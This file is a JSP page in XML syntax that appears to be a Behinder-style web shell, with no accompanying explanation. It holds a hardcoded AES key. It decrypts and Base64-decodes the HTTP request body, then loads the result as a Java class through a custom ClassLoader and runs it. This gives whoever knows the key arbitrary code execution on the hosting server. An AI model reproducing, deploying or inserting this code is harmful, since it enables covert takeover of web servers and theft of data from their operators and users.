<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2">
    <jsp:directive.page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"/>
    <jsp:declaration>
    class U extends ClassLoader{
        U(ClassLoader c){
            super(c);
        }
        public Class g(byte []b){
            return super.defineClass(b,0,b.length);
        }
    }
    </jsp:declaration>
    <jsp:scriptlet>
    String k="e45e329feb5d925b";
    session.putValue("u",k);
    Cipher c=Cipher.getInstance("AES");
    c.init(2,new SecretKeySpec((session.getValue("u")+"").getBytes(),"AES"));
    new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);
    </jsp:scriptlet>
</jsp:root>